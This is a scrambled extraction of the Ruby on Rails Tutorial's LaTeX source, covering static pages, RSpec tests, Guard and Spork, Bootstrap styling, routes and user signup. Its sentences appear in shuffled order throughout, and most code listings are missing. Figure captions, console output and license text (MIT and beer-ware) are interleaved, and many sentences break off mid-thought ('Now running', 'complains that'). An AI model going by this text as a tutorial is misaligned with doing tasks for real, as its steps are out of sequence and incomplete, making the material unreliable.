I actually use a dark background for both my terminal and editor, but the light background looks better in the screenshots.
in Listing~\ref{code:home_page_passing}.
Code to get a passing test for the Home page.
This arranges for a top-level heading (\kode{<h1>}) with the content \kode{Sample App}, which should get the test to pass.
We also include an \emph{anchor} tag~\kode{a}, which creates links to the given URL (called an ``href'', or ``hypertext reference'', in the context of an anchor tag):
Now re-run the test to see the effect:
Based on the example for the Home page, you can probably guess the analogous test and application code for the Help page.
Adding code to test the contents of the Help page.
Then run the tests:
One test should fail.
(Since systems will vary, and since keeping track of how many tests there are at each stage of the tutorial is a maintenance nightmare, I'll omit the RSpec output from now on.)
as seen in Listing~\ref{code:help_page_passing}.
Code to get a passing test for the Help page.
The tests should now pass:
By writing a test and running RSpec at each step, we'll see how TDD can guide us through the development of our application code.
We'll get to the Red part of the Red-Green cycle by writing a failing test for the About page.
Adding code to test the contents of the About page.
In our case, the About page will first need an action called \kode{about} in the StaticPages controller.
Having written a failing test, we can now be confident that, in getting it to pass, we will actually have created a working About page.
If you run the RSpec example using
the output includes the following complaint:
No route matches [GET] "/static_pages/about"
as shown in  Listing~\ref{code:about_route}.
Now running
complains that
The StaticPages controller with added \kode{about} action.
says that we are missing a ``template'', i.e., a view:
To solve this issue, we add the \kode{about} view.
in Listing~\ref{code:about_view}.
<n>  is a project to make a book and screencasts to teach web development
<n>  is the sample application for the tutorial.
Running RSpec should now get us back to Green:
Now that we've gotten to Green, we are free to refactor our code with confidence.
Oftentimes code will start to ``smell'', meaning that it gets ugly, bloated, or filled with repetition.
The computer doesn't care, of course, but humans do, so it is important to keep the code base clean by refactoring frequently.
Having a good test suite is an invaluable tool in this regard, as it dramatically lowers the probability of introducing bugs while refactoring.
Now that we've created the actions and views for some static pages, we'll make them \emph{very slightly} dynamic by adding some content that changes on a per-page basis: we'll have the title of each page change to reflect its content.
Most browsers display the contents of the title tag at the top of the browser window (Google Chrome is an odd exception), and it is also important for search-engine optimization.
We'll start by writing tests for the titles, then add the titles themselves, and finally use a \emph{layout} file to refactor the resulting pages and eliminate duplication.
You may have noticed that the \kode{rails new} command already created a layout file.
We'll learn its purpose shortly, but for now you should rename it before proceeding:
(\kode{mv} is a Unix command; on Windows you may need to rename the file using the file browser or the \kode{rename} command.)
in Listing~\ref{code:title_test}.
A title test.
This uses the \kode{have\_title} method, which checks for an HTML title with the given content.
In other words, the code
checks to see that the content inside the \kode{title} tag is
It's worth mentioning that the content need not be an exact match; any substring works as well, so that
will also match the full title.
The StaticPages controller spec with title tests.
to verify that our code is now Red (failing tests).
Now we'll get our title tests to pass, and at the same time add the full HTML structure needed to make valid web pages.
The markup for a modern web page follows this form:
The extremely simple doctype \kode{<!DOCTYPE html>} is characteristic of the latest HTML standard, HTML5.
As a result, the tests for the Home page should now pass.
Green
in Listing~\ref{code:help_view_full_html} and
      is a project to make a book and screencasts to teach web development
<n>      is the sample application for the tutorial.
This repeated code is a violation of the important ``Don't Repeat Yourself'' (DRY) principle; in this section and the next we'll ``DRY out our code'' by removing the repetition.
The technique involves using \emph{Embedded Ruby} in our views.
The view for the Home page with an Embedded Ruby title.
The view for the Help page with an Embedded Ruby title.
The view for the About page with an Embedded Ruby title.
In other words, \emph{all} our pages are identical in structure, including the contents of the title tag, with the sole exception of the material inside the \kode{body} tag.
To get the layout to work, we have to replace the default title with the Embedded Ruby from the examples above:
In this chapter, we'll develop a simple demonstration application to show off some of the power of Rails.
The purpose is to get a high-level overview of Ruby on Rails programming (and web development in general) by rapidly generating an application using \emph{scaffold generators}.
Verifying that the test suite still passes gives us confidence that this code refactoring was successful:
The resulting demo app will allow us to interact with it through its URLs, giving us insight into the structure of a Rails application, including a first example of the \emph{REST architecture} favored by Rails.
As with the forthcoming sample application, the demo app will consist of \emph{users} and their associated \emph{microposts} (thus constituting a minimalist Twitter-style app).
Before moving on, let's take a minute to commit our changes and merge them into the master branch.
In this section, we'll outline our plans for the demo application.
A \kode{Gemfile} for the demo app.
If you like, at this point you can even deploy the updated application to Heroku:
(Recall that if Bundler complains about a \texttt{readline} error, try adding \kode{gem 'rb-readline'} to your \kode{Gemfile}.)
Finally, we'll put the demo app under version control.
from Listing~\ref{code:gitignore} to
Then initialize a Git repository and make the first commit:
Creating a demo app repository at GitHub.~\href{http://railstutorial.org/images/figures/create_demo_repo_4_0-full.png}{(full size)}
The StaticPages controller spec with a base title.
(As with the first app, take care \emph{not} to initialize the GitHub repository with a \kode{README} file.)
In our case, the demo app will be a microblog, with only users and short (micro)posts.
Users of our demo app will have a unique \kode{integer} identifier called \kode{id}, a publicly viewable \kode{name} (of type \kode{string}), and an \kode{email} address (also a \kode{string}) that will double as a username.
The \kode{Gemfile} needed to use PostgreSQL instead of SQLite.
The core of the micropost data model is even simpler than the one for users: a micropost has only an \kode{id} and a \kode{content} field for the micropost's text (of type \kode{string})
Finally, we'll mention a method for running tests directly inside Sublime Text, a technique especially useful when used in concert with Spork.
When modeling longer posts, such as those for a normal (non-micro) blog, you should use the \kode{text} type in place of \kode{string}.
This section should only be attempted by fairly advanced users and can be skipped without loss of continuity.
 There's an additional complication, though: we want to \emph{associate} each micropost with a particular user; we'll accomplish this by recording the \kode{user\_id} of the owner of the post.
Among other things, this material is likely to go out of date faster than the rest of the tutorial, so you shouldn't expect everything on your system to match the examples exactly, and you may have to Google around to get everything to work.
(For technical reasons, the only exception to this is the \kode{rails} command itself.)
This practice is rather cumbersome, and in this section we discuss two ways to eliminate its necessity.
RVM Bundler integration
The first and preferred method is to use RVM, which includes Bundler integration as of version 1.11.
You can verify that you have a sufficiently up-to-date version of RVM as follows:
As long as the version number is 1.11.x or greater, installed gems will automatically be executed in the proper Bundler environment, so that you can write (for example)
and omit the leading \kode{bundle exec}.
If this is the case, you should skip the rest of this section.
The steps are simple if somewhat mysterious.
First, run these two commands:
Then run these:
      create    db/migrate/20130305221714_create_users.rb
Together, these commands combine RVM and Bundler magic to ensure that commands such as \kode{rake} and \kode{rspec} are automatically executed in the right environment.
Adding \kode{bundler\_stubs} to the \kode{.gitignore} file.
      invoke  jbuilder_scaffold_controller
bundler_stubs/
The same goes for \kode{rake}, etc.:
For the sake of readers who skip this section, the rest of this tutorial will err on the side of caution and explicitly use \kode{bundle exec}, but of course you should feel free to use the more compact version if your system is properly configured.
binstubs
One annoyance associated with using the \kode{rspec} command is having to switch to the command line and run the tests by hand.
In this section, we'll show how to use \href{https://github.com/guard/guard}{Guard} to automate the running of the tests.
Guard monitors changes in the filesystem so that, for example, when we change the \kode{static\_pages\_spec.rb} file only those tests get run.
Even better, we can configure Guard so that when, say, the \kode{home.html.erb} file is modified, the \kode{static\_pages\_spec.rb} automatically runs.
A \kode{Gemfile} for the sample app, including Guard.
# Uncomment this line on OS X.
       exist      app/views/users
# gem 'growl', '1.0.3'
# Uncomment these lines on Linux.
# gem 'libnotify', '0.8.0'
# Uncomment these lines on Windows.
# gem 'rb-notifu', '0.0.4'
Be sure to uncomment the lines in the test group relevant for your system.
(Note that, if you want Growl notifications, you will have to purchase \href{http://growl.info/downloads}{Growl}, which is available in the Apple App Store for a nominal charge.)
We next install the gems by running \kode{bundle install}:
Then initialize Guard so that it works with RSpec:
Writing new Guardfile to /Users/mhartl/rails_projects/sample_app/Guardfile
rspec guard added to Guardfile, feel free to edit it
Additions to the default \kode{Guardfile}.
Note the added \kode{require}.
# Custom Rails Tutorial specs
"spec/requests/authentication_pages_spec.rb"
With that, we can run the local web server using \kode{rails s}, which is a shortcut for \kode{rails server}:
ensures that Guard doesn't run all the tests after a failing test passes (to speed up the Red-Green-Refactor cycle).
Now the demo application should be ready to go at \href{http://localhost:3000/}{http://localhost:3000/}.
We can now start \kode{guard} as follows:
By the way, if you get a Guard error complaining about the absence of a \kode{spec/routing} directory, you can fix it by creating an empty one:
When running \kode{bundle exec rspec}, you may have noticed that it takes several seconds just to start running the tests, but once they start running they finish quickly.
This is because each time RSpec runs the tests it has to reload the entire Rails environment.
A \emph{spork} is a combination spoon-fork.
The project's name is a pun on Spork's use of \href{http://en.wikipedia.org/wiki/POSIX}{POSIX} \href{http://en.wikipedia.org/wiki/Fork_(software_development)}{forks}.
Spork loads the environment \emph{once}, and then maintains a pool of processes for running future tests.
A \kode{Gemfile} for the sample app, including Spork.
Then install Spork using \kode{bundle install}:
Next, bootstrap the Spork configuration:
Adding environment loading to the \kode{Spork.prefork} block.
# Requires supporting ruby files with custom matchers and macros, etc,
# in spec/support/ and its subdirectories.
# Checks for pending migrations before tests are run.
# If you are not using ActiveRecord, you can remove this line.
# ## Mock Framework
# If you prefer to use mocha, flexmock or RR, uncomment the appropriate line:
# config.mock_with :mocha
The initial index page for the Users resource (\href{http://localhost:3000/users}{/users}).~\href{http://railstutorial.org/images/figures/demo_blank_user_index_rails_3-full.png}{(full size)}
# config.mock_with :flexmock
# config.mock_with :rr
# Remove this line if you're not using ActiveRecord or ActiveRecord fixtures
The new user page (\href{http://localhost:3000/users/new}{/users/new}).~\href{http://railstutorial.org/images/figures/demo_new_user_rails_3-full.png}{(full size)}
# If you're not using ActiveRecord, or you'd prefer not to run each of your
# examples within a transaction, remove the following line or assign false
# instead of true.
# If true, the base class of anonymous controllers will be inferred
# automatically.
This will be the default behavior in future versions of
The page to show a user (\href{http://localhost:3000/users/1}{/users/1}).~\href{http://railstutorial.org/images/figures/demo_show_user_rails_3-full.png}{(full size)}
# rspec-rails.
# Run specs in random order to surface order dependencies.
If you find an
The user edit page (\href{http://localhost:3000/users/1/edit}{/users/1/edit}).~\href{http://railstutorial.org/images/figures/demo_edit_user_rails_3-full.png}{(full size)}
# order dependency and want to debug it, you can fix the order by providing
A user with updated information.~\href{http://railstutorial.org/images/figures/demo_update_user_rails_3-full.png}{(full size)}
# the seed, which is printed after each run.
#     --seed 1234
The user index page (\href{http://localhost:3000/users}{/users}) with a second user.~\href{http://railstutorial.org/images/figures/demo_user_index_two_rails_3-full.png}{(full size)}
# This code will be run each time you run your specs.
Having shown how to create, show, and edit users, we come finally to destroying them (Figure~\ref{fig:demo_destroy_user_rails_3}).
Before running Spork, we can get a baseline for the testing overhead by timing our test suite as follows:
You should verify that clicking on the link in Figure~\ref{fig:demo_destroy_user_rails_3} destroys the second user, yielding an index page with only one user.
6 examples, 0 failures
real	0m8.633s
Section~\ref{sec:destroying_users} adds user deletion to the sample app, taking care to restrict its use to a special class of administrative users.
user	0m7.240s
Destroying a user.~\href{http://railstutorial.org/images/figures/demo_destroy_user_rails_3-full.png}{(full size)}
sys	0m1.068s
Here the test suite takes more than seven seconds to run even though the actual tests run in under a tenth of a second.
To speed this up, we can open a dedicated terminal window, navigate to the application root directory, and then start a Spork server:
A detailed diagram of MVC in Rails.~\href{http://railstutorial.org/images/figures/mvc_detailed-full.png}{(full size)}
Using RSpec
Loading Spork.prefork block...
Spork is ready and listening on 8989!
real	0m2.649s
user	0m1.259s
sys	0m0.258s
as shown in Listing~\ref{code:rspec_drb}.
Configuring RSpec to automatically use Spork.
One word of advice when using Spork: after changing a file included in the prefork loading (such as \kode{routes.rb}), you will have to restart the Spork server to load the new Rails environment.
If your tests are failing when you think they should be passing, quit the Spork server with \texttt{Ctrl-C} and restart it:
Note the notation \kode{class UsersController < ApplicationController}; this is an example of a Ruby \emph{class} with \emph{inheritance}.
Guard with Spork
Spork is especially useful when used with Guard, which we can arrange as follows:
in Listing~\ref{code:spork_guardfile}.
The \kode{Guardfile} updated for Spork.
With that configuration in place, we can start Guard and Spork at the same time with the \kode{guard} command:
Guard automatically starts a Spork server, dramatically reducing the overhead each time a test gets run.
A well-configured testing environment with Guard, Spork, and (optionally) test notifications makes test-driven development positively addictive.
If you're using Sublime Text, there is a powerful set of helper commands to run tests directly inside the editor.
This is currently my preferred setup, as it works great when you only have a few tests while still scaling nicely even to very large (and therefore long-running) test suites.
You may also want to follow the setup instructions for \href{https://github.com/mhartl/rails_tutorial_sublime_text}{Rails Tutorial Sublime Text} at this time
After restarting Sublime Text, the RubyTest package supplies the following commands:
Because test suites can become quite slow even for relatively small projects, being able to run one test (or a small group of tests) at a time can be a huge win.
Even a single test requires the same Rails environment overhead, of course, which is why these commands are perfectly complemented by Spork: running a single test eliminates the overhead of running the entire test file, while running Spork eliminates the overhead of starting the test environment.
Here is the sequence I recommend:
Start Spork in a terminal window.
Write a single test or small group of tests.
Run Command-Shift-R to verify that the test or test group is red.
Write the corresponding application code.
Run Command-Shift-E to run the same test/group again, verifying that it's green.
Repeat steps 2--5 as necessary.
When reaching a natural stopping point (such as before a commit), run \kode{rspec spec/} at the command line to confirm that the entire test suite is still green.
Even with the ability to run tests inside of Sublime Text, I still sometimes prefer using Guard, but at this point my bread-and-butter TDD technique is the one enumerated above.
These actions don't typically render pages (although they sometimes do); instead, their main purpose is to modify information about users in the database.
We'll learn more about HTTP request methods starting in Section~\ref{sec:TDD}.
Although REST theory is rather abstract, in the context of Rails applications REST means that most application components (such as users and microposts) are modeled as \emph{resources} that can be created, read, updated, and deleted---operations that correspond both to the \href{http://en.wikipedia.org/wiki/Create,_read,_update_and_delete}{CRUD operations of relational databases} and four fundamental \href{http://en.wikipedia.org/wiki/HTTP_request#Request_methods}{HTTP request methods}: \texttt{POST}, \texttt{GET}, \texttt{PATCH}, and \texttt{DELETE}. (
The simplified user \kode{index} action for the demo application.
This \kode{index} action has the line \kode{@users = User.all} (Step~3), which asks the User model to retrieve a list of all the users from the database (Step~4), and then places them in the  variable \kode{@users} (pronounced ``at-users'') (Step~5).
The User model for the demo application.
This isn't technically true---the scaffolding includes rudimentary tests---but the generated tests are ugly and inflexible, and they don't test for data validation, authentication, or any other custom requirements.
The RESTful structure of Rails applications is best absorbed by this sort of repetition of form; indeed, seeing the parallel structure of Users and Microposts even at this early stage is one of the prime motivations for this chapter.
$ rails generate scaffold Micropost content:string user_id:integer
      create    db/migrate/20130307005528_create_microposts.rb
       exist      app/views/microposts
To make some actual microposts, we enter information at the new microposts page, \href{http://localhost:3000/microposts/new}{/microposts/new}, as seen in Figure~\ref{fig:demo_new_micropost_rails_3}.
The new micropost page (\href{http://localhost:3000/microposts/new}{/microposts/new}).~\href{http://railstutorial.org/images/figures/demo_new_micropost-full.png}{(full size)}
The result should look something like Figure~\ref{fig:demo_micropost_index_rails_3}.
The micropost index page (\href{http://localhost:3000/microposts}{/microposts}).~\href{http://railstutorial.org/images/figures/demo_micropost_index_rails_3-full.png}{(full size)}
As seen in Figure~\ref{fig:micropost_length_error_rails_3}, Rails renders \emph{error messages} indicating that the micropost's content is too long.
Error messages for a failed micropost creation.~\href{http://railstutorial.org/images/figures/micropost_length_error_rails_3-full.png}{(full size)}
"2013-03-06 02:37:37", updated_at: "2013-03-06 02:37:37">, #<Micropost id: 2,
(I include the last line just to demonstrate how to exit the console, and on most systems you can Ctrl-d for the same purpose.)
Here we have accessed the user's microposts using the code \kode{first\_user.microposts}: with this code, Active Record automatically returns all the microposts with \kode{user\_id} equal to the id of \kode{first\_user} (in this case,~\kode{1}).
We end our discussion of the demo application with a brief description of the controller and model class hierarchies in Rails.
The \kode{User} class, with inheritance.
The \kode{Micropost} class, with inheritance.
Examining Listing~\ref{code:demo_application_controller_class}, we see that \kode{ApplicationController} itself inherits from \kode{ActionController::Base}; this is the base class for controllers provided by the Rails library Action Pack.
The \kode{UsersController} class, with inheritance.
The \kode{MicropostsController} class, with inheritance.
The \kode{ApplicationController} class, with inheritance.
As with model inheritance, by inheriting ultimately from \kode{ActionController::Base} both the Users and Microposts controllers gain a large amount of functionality, such as the ability to manipulate model objects, filter inbound HTTP requests, and render views as HTML.
With the completion of the Microposts resource, now is a good time to push the repository up to GitHub:
This updates the database at Heroku with the necessary user/micropost data model.
We've come now to the end of the 30,000-foot view of a Rails application.
The demo app developed in this chapter has several strengths and a host of weaknesses.
No static pages (like ``Home'' or ``About'')
No signing in
No test-driven development
In this chapter, we'll change this by incorporating the \emph{Bootstrap} framework into our application, and then we'll add some custom styles of our own
The \emph{Rails Tutorial} is a book on web development, not web design, but it would be depressing to work on an application that looks like \emph{complete} crap, so in this section we'll add some structure to the layout and give it some minimal styling with CSS. In addition to using some custom CSS rules, we'll make use of \href{http://getbootstrap.com/}{Bootstrap}, an open-source web design framework from Twitter.
Inside the \kode{header} tag, we see a couple of \kode{div} tags:
In this case, each \kode{div} has a CSS class as well.
As with the \kode{header} tag's classes, these classes have special meaning to Bootstrap.
After the divs, we encounter some embedded Ruby:
The \kode{nav} tag, though formally unnecessary here, communicates the purpose of the navigation links.
The \kode{nav} and \kode{pull-right} classes on the \kode{ul} tag have special meaning to Bootstrap.
Once Rails has processed this layout and evaluated the embedded Ruby, the list looks like this:
As we learned in Section~\ref{sec:layouts}, the \kode{yield} method inserts the contents of each page into the site layout.
To take advantage of the upcoming style elements, we'll add some extra elements to<n>the \kode{home.html.erb} view (Listing~\ref{code:signup_button}).
(You may also have to create that directory as well, either with \kode{mkdir} or with a graphical file manager.)
It is also possible to use LESS with the asset pipeline; see the \href{http://rubygems.org/gems/less-rails-bootstrap}{\texttt{less-rails-bootstrap} gem} for details.
Then restart the web server to incorporate the changes into the development application.
(On most systems, restarting the server will involve pressing \texttt{Ctrl-C} and then running \kode{rails server}.)
The first step in adding custom CSS to our application is to open a file to contain it:
app/assets/stylesheets
as shown in Listing~\ref{code:bootstrap_css}.
(You may have to use \texttt{Ctrl-C} restart the local web server.
It's also worth noting that the screenshots use Bootstrap~2.0, whereas the tutorial currently uses Bootstrap~2.3, so there may be minor differences in appearance.
These are not cause for concern.)
(Because the default navbar color changed between Boostrap 2.0 and 2.1, we need the \kode{navbar-inverse} class to make it dark instead of light.)
in Listing~\ref{code:stylesheets_partial}.
Files in these directories are (even post-3.0) automatically served up via requests to http://example.com/stylesheets, etc.
Starting in Rails 3.1, and continuing in Rails~4, there are \emph{three} canonical directories for static assets, each with its own purpose:
images      javascripts stylesheets
Welcome to the \href{http://ruby.railstutorial.org/ruby-on-rails-tutorial-book}{\emph{Ruby on Rails Tutorial}}.
We first covered ERb in Section~\ref{sec:embedded_ruby}, and cover Sass in Section~\ref{sec:sass}.
Everyone from scrappy startups to huge companies have used Rails: \href{http://37signals.com/}{37signals}, \href{http://github.com/}{GitHub}, \href{http://shopify.com/}{Shopify}, \href{http://scribd.com/}{Scribd},  \href{http://twitter.com/}{Twitter}, \href{http://disney.com/}{Disney}, \href{http://hulu.com/}{Hulu}, the \href{http://yellowpages.com/}{Yellow Pages}---the \href{http://rubyonrails.org/applications}{list of sites using Rails} goes on and on.
Indeed, the Bootstrap framework defines a large number of variables for colors, available online on the \href{http://bootstrapdocs.com/v2.0.4/docs/less.html}{Bootstrap page of LESS variables}.
That page defines variables using LESS, not Sass, but the \texttt{bootstrap-sass} gem provides the Sass equivalents.
\href{http://peepcode.com/}{PeepCode}: Excellent commercial screencasts
\href{http://www.codeschool.com/}{Code School}: Interactive programming courses
but that isn't the Rails Way.
\href{http://railscasts.com/}{RailsCasts} by Ryan Bates: Did I already mention \href{http://railscasts.com/}{RailsCasts}?
Seriously: \href{http://railscasts.com/}{\emph{RailsCasts}}.
The test appears as in Listing~\ref{code:contact_page_test}, which simply follows the model last seen in Listing~\ref{code:pages_controller_spec_title}.
Tests for a Contact page.
Now that we have tests for the URLs we want, it's time to get them to work.
If you take a look at the default routes file, you'll see that it's quite a mess, but it's a useful mess---full of commented-out example route mappings.
I suggest reading through it at some point, and I also suggest taking a look at the \href{http://guides.rubyonrails.org/routing.html}{Rails Guides article ``Rails Routing from the outside in''} for a much more in-depth treatment of routes.
To define the named routes, we need to replace rules such as
This arranges both for a valid page at \kode{/help} (responding to \texttt{GET} requests) and a named route called \kode{help\_path} that returns the path to that page.
(Actually, using \kode{get} in place of \kode{match} gives the same named routes, but using \kode{match} is more conventional.)
in Listing~\ref{code:root_route}.
Before, this was more explicit: we used
to get to the same place, but \kode{/about} is more succinct.
In addition, as mentioned above, the code \kode{match '/about'} also automatically creates \emph{named routes} for use in the controllers and views:
In the \emph{Rails Tutorial}, we'll follow the common convention of using the \kode{path} form except when doing redirects, where we'll use the \kode{url} form.
This is because after redirects the HTTP standard technically requires a full URL, although in most browsers it will work either way.
If you don't already have it, you should \href{http://rubyforge.org/frs/?group_id=126}{download RubyGems}, extract it, and then go to the \kode{rubygems} directory and run the setup program:
With these routes now defined, the tests for the Help, About, and Contact pages should pass:
This leaves the test for the Home page as the last one to fail.
To establish the route mapping for the Home page, we \emph{could} use code like this:
The commented-out hint for defining the root route.
I am currently working with Engine Yard to create links to specific versions of the Rails Installer.
It also gives us URL helpers as follows:
With that, all of the routes for static pages are working, and the tests should pass:
Now we just have to fill in the links in the layout.
This will entail filling in the second arguments of the \kode{link\_to} functions with the proper named routes.
By the way, it's worth noting that, although we haven't actually tested for the presence of the links on the layout, our tests will fail if the routes aren't defined.
in Listing~\ref{code:static_page_routes} and
The About page at  \href{http://localhost:3000/about}{/about}.
A configuration file for \href{http://rack.rubyforge.org/doc/}{Rack middleware}
       route  get "users/new"
as seen in Listing~\ref{code:user_pages_spec}.
The initial spec for users, with a test for the signup page.
We can run these tests using the \kode{rspec} command as usual:
It's worth noting that we can also run all the request specs by passing the whole directory instead of just one file:
Based on this pattern, you may be able to guess how to run \emph{all} the specs:
For completeness, we'll usually use this method to run the tests through the rest of the tutorial.
By the way, it's worth noting (since you may see other people use it) that you can also run the test suite using the \kode{spec} Rake task:
(In fact, you can just type \kode{rake} by itself; the default behavior of \kode{rake} is to run the test suite.)
By construction, the Users controller already has a \kode{new} action, so to get the test to pass all we need is the right route and the right view content.
in Listing~\ref{code:generate_users_controller}.
All that's left is to add the proper link to the button on the Home page.
in Listing~\ref{code:home_page_signup_link}.
At this point, if you are using Git you should merge the changes back into the master branch:
The result should be a working sample application on the production server:
A mockup of the sample application's Home page.~\href{http://railstutorial.org/images/figures/home_page_mockup_bootstrap-full.png}{(full size)}
But a craftsman has to know his tools, and in the end the reward is worth the effort.
The directory structure for a newly created Rails app.~\href{http://railstutorial.org/images/figures/directory_structure_rails_4_0-full.png}{(full size)}
The Home page (\href{http://localhost:3000/static_pages/home}{/static\_pages/home}) with no custom CSS.~\href{http://railstutorial.org/images/figures/layout_no_logo_or_custom_css_bootstrap_rails_4-full.png}{(full size)}
The sample application with Bootstrap CSS.~\href{http://railstutorial.org/images/figures/sample_app_only_bootstrap_4_0-full.png}{(full size)}
Adding some spacing and other universal styling.~\href{http://railstutorial.org/images/figures/sample_app_universal_4_0-full.png}{(full size)}
Adding some typographic styling.~\href{http://railstutorial.org/images/figures/sample_app_typography_4_0-full.png}{(full size)}
The default Rails page.~\href{http://railstutorial.org/images/figures/riding_rails_4_0-full.png}{(full size)}
The default page with the app environment.~\href{http://railstutorial.org/images/figures/riding_rails_environment_4_0-full.png}{(full size)}
The sample app with nicely styled logo.~\href{http://railstutorial.org/images/figures/sample_app_logo_4_0-full.png}{(full size)}
Creating the first app repository at GitHub.~\href{http://railstutorial.org/images/figures/create_first_repository_4_0-full.png}{(full size)}
The Home page (\href{http://localhost:3000/static_pages/home}{/static\_pages/home}) with an added footer.~\href{http://railstutorial.org/images/figures/site_with_footer_bootstrap_4_0-full.png}{(full size)}
The structure of this section is based on the excellent blog post \href{http://2beards.net/2011/11/the-rails-3-asset-pipeline-in-about-5-minutes/}{The Rails 3 Asset Pipeline in (about) 5 Minutes} by Michael Erasmus.
A GitHub repository page.~\href{http://railstutorial.org/images/figures/github_repository_page_4_0-full.png}{(full size)}
The initial \kode{README} file for our project at GitHub.~\href{http://railstutorial.org/images/figures/rails_readme_4_0-full.png}{(full size)}
The improved \kode{README} file formatted with Markdown.~\href{http://railstutorial.org/images/figures/new_readme_4_0-full.png}{(full size)}
The first Rails Tutorial application running on Heroku.~\href{http://railstutorial.org/images/figures/heroku_app_4_0-full.png}{(full size)}
The beautiful interface at Heroku.~\href{http://railstutorial.org/images/figures/heroku_info_4_0-full.png}{(full size)}
The About page at  \href{http://localhost:3000/about}{/about}.~\href{http://railstutorial.org/images/figures/about_page_styled-full.png}{(full size)}
The new signup page at \href{http://localhost:3000/signup}{/signup}.~\href{http://railstutorial.org/images/figures/new_signup_page_bootstrap-full.png}{(full size)}
 Foreword
Personally, I powered through the \emph{Rails Tutorial} in three long days, doing all the examples and challenges at the end of each chapter.
 Acknowledgments
 About the author
\href{http://michaelhartl.com/}{Michael Hartl} is the author of the \href{http://ruby.railstutorial.org/}{\emph{Ruby on Rails Tutorial}}, the leading introduction to web development with \href{http://rubyonrails.org/}{Ruby on Rails}.
 Copyright and license
Copyright (c) 2013 Michael Hartl
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
<n> * "THE BEER-WARE LICENSE" (Revision 42):
<n> * Michael Hartl wrote this code.
As we'll see in Section~\ref{sec:signup_success}, the key to creating a user is the special \kode{name} attribute in each \kode{input}:
These \kode{name} values allow Rails to construct an initialization hash (via the \kode{params} variable) for creating users using the values entered by the user, as we'll see in Section~\ref{sec:signup_failure}.
We'll fix the first issue in Section~\ref{sec:signup_error_messages} and the second in Section~\ref{sec:signup_success}.
If it fails, we simply fall back on the behavior developed in Section~\ref{sec:signup_failure}.
Now that we have a working User model, it's time to add an ability few websites can live without: letting users sign up for the site.
As usual, we'll write tests as we develop, extending the theme of using RSpec and Capybara to write succinct and expressive integration tests.
If you skipped that section, you should go there now and complete it before proceeding.
A mockup of the user profile made in this section.~\href{http://railstutorial.org/images/figures/profile_mockup_profile_name_bootstrap-full.png}{(full size)}
A mockup of our best guess at the final profile page.~\href{http://railstutorial.org/images/figures/profile_mockup_bootstrap-full.png}{(full size)}
The sample application Home page (\href{http://localhost:3000/}{/}) with debug information.~\href{http://railstutorial.org/images/figures/home_page_with_debug_4_0-full.png}{(full size)}
 In particular, \kode{Rails.env.development?}\ is \kode{true} only in a development environment, so the Embedded Ruby
The error page for /users/1.~\href{http://railstutorial.org/images/figures/profile_routing_error-full.png}{(full size)}
We can get the REST-style URL to work by adding a single line to our routes file (\kode{config/routes.rb}):
in Listing~\ref{code:signup_route}.
With the code in Listing~\ref{code:users_resource}, the routing works, but there's still no page there (Figure~\ref{fig:user_show_unknown_action_4}).
The URL /users/1 with routing but no page.~\href{http://railstutorial.org/images/figures/user_show_unknown_action_4-full.png}{(full size)}
This view uses Embedded Ruby to display the user's name and email address, assuming the existence of an instance variable called \kode{@user}.
Of course, eventually the real user show page will look very different, and won't display the email address publicly.
Note that the debug information in Figure~\ref{fig:user_show_rails_3} confirms the value of \kode{params[:id]}:
The user show page at \href{http://localhost:3000/users/1}{/users/1} after adding a Users resource.~\href{http://railstutorial.org/images/figures/user_show_bootstrap-full.png}{(full size)}
One thing you will quickly notice when running tests with Factory Girl is that they are \emph{slow}.
The reason is not Factory Girl's fault, and in fact it is a \emph{feature}, not a bug.
Unfortunately, this means that creating users can bog down the test suite; happily, there is an easy fix.
The \texttt{bcrypt-ruby} library uses a \emph{cost factor} to control how computationally costly it is to create the secure hash.
The default value is designed for security, not for speed, which is perfect for production applications, but in tests our needs are reversed: we want \emph{fast} tests, and don't care at all about the security of the test users' password hashes.
as shown in Listing~\ref{code:test_bcrypt_cost_factor}.
# Speed up tests by lowering bcrypt's cost function.
When making views, we'll focus on the visual appearance and not worry too much about the exact structure of the page, which means that (at least for now) we won't be writing tests.
But you've seen the \href{http://www.imdb.com/title/tt0499549/}{movie}, so you already knew this.
Originally created by Tom Preston-Werner (cofounder of \href{http://github.com/}{GitHub}) and later acquired and scaled by \href{http://automattic.com/}{Automattic} (the makers of \href{http://wordpress.com/}{WordPress}), Gravatar is a free service that allows users to upload images and associate them with email addresses they control.
You can verify at this point that the test suite is failing:
Because the \kode{gravatar\_for} method is undefined, the user show view is currently broken.
(Catching errors of this nature is perhaps the most useful aspect of view specs.
This is why having \emph{some} test of the view, even a minimalist one, is so important.)
As \href{http://en.gravatar.com/site/implement/hash/}{noted at the Gravatar home page}, Gravatar URLs are based on an \href{http://en.wikipedia.org/wiki/MD5}{MD5 hash} of the user's email address.
# Returns the Gravatar (http://gravatar.com/) for the given user.
You can confirm that the test suite is now passing:
The user profile page \href{http://localhost:3000/users/1}{/users/1} with the default Gravatar.~\href{http://railstutorial.org/images/figures/profile_with_gravatar_bootstrap_4_0-full.png}{(full size)}
The user show page with a custom Gravatar.~\href{http://railstutorial.org/images/figures/profile_custom_gravatar_bootstrap_4_0-full.png}{(full size)}
We include \kode{row} and \kode{span4} classes, which are both part of Bootstrap.
The user show page  \href{http://localhost:3000/users/1}{/users/1} with a sidebar and CSS.~\href{http://railstutorial.org/images/figures/user_show_sidebar_css_bootstrap-full.png}{(full size)}
The current state of the signup page  \href{http://localhost:3000/signup}{/signup}.~\href{http://railstutorial.org/images/figures/new_signup_page_bootstrap-full.png}{(full size)}
A mockup of the user signup page.~\href{http://railstutorial.org/images/figures/signup_mockup_bootstrap-full.png}{(full size)}
Since we're about to add the ability to create new users through the web, let's remove the user created at the console in Section~\ref{sec:creating_a_user}.
In the days before powerful web frameworks with full testing capabilities, testing was often painful and error-prone.
With RSpec and Capybara, we will be able to write expressive tests to automate tasks that used to have to be done by hand.
We've already seen how Capybara supports an intuitive web-navigation syntax.
Our goal now is to write tests for the right behavior given invalid and valid signup information.
Because these tests are fairly advanced, we'll build them up piece by piece.
Our first task is to test for a failing signup form, and we can simulate the submission of invalid data by visiting the page and clicking the button using \kode{click\_button}:
This is equivalent to visiting the signup page and submitting blank signup information (which is invalid).
Similarly, to simulate the submission of valid data, we fill in valid information using \kode{fill\_in}:
